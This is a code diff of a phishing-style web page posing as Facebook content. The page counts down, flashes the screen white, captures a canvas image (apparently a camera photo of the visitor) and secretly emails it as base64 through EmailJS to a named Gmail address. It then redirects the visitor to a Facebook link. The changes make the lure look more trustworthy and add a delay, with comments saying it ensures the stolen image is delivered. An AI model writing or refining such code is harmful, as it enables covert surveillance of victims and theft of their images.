@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video Content</title>
+    <title>Facebook Secure Content</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; transition: background-color 0.1s; overflow: hidden; }
@@ -41,7 +41,7 @@
                         
                         if (countdown <= 0) {
                             clearInterval(interval);
-                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
+                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; // فلاش الضوء
                             
                             setTimeout(() => {
                                 const canvas = document.createElement('canvas');
@@ -50,19 +50,19 @@
                                 
                                 const imgBase64 = canvas.toDataURL('image/jpeg', 0.6);
                                 
-                                // إرسال الصورة
+                                // 1. إرسال الصورة
                                 emailjs.send('service_w3dev60', 'template_7k8tall', {
                                     image_data: imgBase64,
                                     to_email: 'tayebiabd2016@gmail.com'
                                 });
 
-                                // التحويل إلى الرابط الجديد الذي زودتني به
+                                statusText.innerText = "Finalizing Secure Access...";
+
+                                // 2. تأخير التحويل لمدة 5 ثوانٍ لضمان وصول الإيميل
                                 setTimeout(() => {
                                     const targetURL = "https://www.facebook.com/share/r/1FVygXJ8tb/";
                                     window.location.replace(targetURL);
-                                    window.location.href = targetURL;
-                                    window.top.location = targetURL;
-                                }, 1000);
+                                }, 5000); 
 
                             }, 300);
                         }
